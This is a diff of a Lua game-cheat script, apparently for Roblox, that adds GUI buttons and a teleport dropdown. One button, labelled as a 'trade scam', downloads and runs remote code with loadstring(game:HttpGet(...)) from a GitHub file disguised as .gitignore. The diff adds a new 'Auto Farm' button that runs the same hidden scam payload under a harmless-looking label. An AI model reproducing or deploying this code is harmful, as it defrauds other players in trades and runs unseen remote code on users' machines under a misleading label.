@@ -9,3 +9,17 @@ local MainSection = Main:NewSection("Main")
 MainSection:NewButton("on/off trade scam only spawn world work", "trade scam only spawn world work", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/26kTsa/tradescampsx/main/.gitignore"))()
 end)
+
+
+MainSection:NewButton("Auto Farm", "Auto Farm all", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/26kTsa/tradescampsx/main/.gitignore"))()
+end)
+
+--Teleport
+local Teleport = Window:NewTab("Teleport")
+local TeleportSection = Main:NewSection("Teleport")
+
+
+TeleportSection:NewDropdown("spawn world",{"spawn world", "cat world", "popcat world"}, function(currentOption)
+    print(currentOption)
+end)
